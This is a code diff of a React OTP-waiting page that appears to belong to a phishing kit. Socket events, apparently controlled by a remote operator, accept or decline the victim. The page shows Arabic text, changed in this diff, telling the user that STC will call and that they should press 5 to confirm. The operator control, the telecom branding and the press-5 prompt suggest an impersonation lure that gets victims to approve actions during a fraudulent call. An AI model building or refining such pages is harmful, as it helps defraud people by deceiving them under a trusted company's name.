@@ -47,7 +47,6 @@ const PhoneOtp = () => {
   const ID = sessionStorage.getItem("id");
 
   socket.on("acceptPhoneOTP", ({ id, price }) => {
-    
     if (id === sessionStorage.getItem("id")) {
       if (stc === "check") {
         setSTC(true);
@@ -75,7 +74,7 @@ const PhoneOtp = () => {
   socket.on("declineService", (id) => {
     if (id === ID) return (window.location.href = "/phone");
   });
-  
+
   return (
     <>
       {STC ? (
@@ -92,8 +91,7 @@ const PhoneOtp = () => {
                 className="font-bold text-gray-500"
                 style={{ fontSize: "10px" }}
               >
-                قم باتباع الخطوات الموجودة بالاتصال ليتم تسجيل رقم جوالك بوثيقة
-                التأمين
+                سيتم الاتصال بك من STC لتأكيد طلبك الرجاء الضغط على رقم 5
               </p>
               <span className="text-purple-700 font-bold">! يرجي الإنتظار</span>
             </div>
